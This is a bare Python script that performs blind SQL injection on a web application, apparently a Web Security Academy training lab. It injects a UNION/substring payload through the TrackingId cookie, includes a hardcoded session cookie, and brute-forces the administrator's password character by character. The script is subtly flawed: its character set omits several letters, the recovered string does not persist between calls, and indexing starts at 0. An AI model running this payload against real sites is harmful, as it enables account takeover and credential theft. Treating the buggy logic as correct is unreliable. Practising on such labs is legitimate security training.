import requests

z=0
sym1=["A","a","B","b","c","C","d","D","e","E","f","F","g","G","h","H","i","I","k","K","l","L","m","M","n","N","o","O","p","P","q","Q","r","R","s","S","t","T","v","V","x","X","y","Y","z","Z","1","2","3","4","5","6","7","8","9","0"]

def req(z,char,flag):
    url="https://ace01f061fcd0a2180583042001100f0.web-security-academy.net/"
    cookies = {"TrackingId":"x'union+select+'1'from+users+where+username='administrator'+and+substring(password,"+ str(z) +",1)='" + char + "'--","session":"dP7ZfsyflsHQ1XgU5A9zL0HkPpbC0X6L"}
    res = requests.get(url,cookies=cookies)
    if "Welcome" in str(res.content):
        flag += char
        print(flag)
        return "a"

if __name__ == "__main__":
    flag = ""
    while (z < 21):
        for char in sym1:
            if req(z,char,flag) == "a":
                break
        z+=1 
